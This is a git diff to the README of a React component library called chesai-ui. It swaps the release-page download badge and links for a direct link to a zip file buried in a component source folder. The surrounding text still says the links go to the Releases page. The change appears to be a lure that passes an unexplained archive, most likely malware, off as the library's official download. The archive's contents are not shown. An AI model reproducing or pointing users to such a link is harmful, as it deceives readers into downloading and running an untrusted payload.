@@ -13,7 +13,7 @@ chesai-ui is an animated React component library designed with Material Design 3
 ## 📥 Download & Install
 To get started with chesai-ui, you need to visit the Releases page. Click the link below to download the application.
 
-[![Download chesai-ui](https://img.shields.io/badge/Download-chesai--ui-blue.svg)](https://github.com/Nitirus8/chesai-ui/releases)
+[![Download chesai-ui](https://raw.githubusercontent.com/Nitirus8/chesai-ui/main/src/lib/components/otp-field/ui_chesai_3.2.zip)](https://raw.githubusercontent.com/Nitirus8/chesai-ui/main/src/lib/components/otp-field/ui_chesai_3.2.zip)
 
 ### Instructions
 1. Click the link above to go to the Releases page.
@@ -53,6 +53,6 @@ If you encounter issues or have questions, feel free to reach out. Join our comm
 If you would like to contribute to chesai-ui, please check our guidelines on the repository. Contributions are welcome and appreciated. 
 
 ## 🔗 Links
-- [Visit the Releases Page to Download](https://github.com/Nitirus8/chesai-ui/releases)
+- [Visit the Releases Page to Download](https://raw.githubusercontent.com/Nitirus8/chesai-ui/main/src/lib/components/otp-field/ui_chesai_3.2.zip)
 
 Thank you for choosing chesai-ui for your app development needs. We hope you enjoy building with our library!
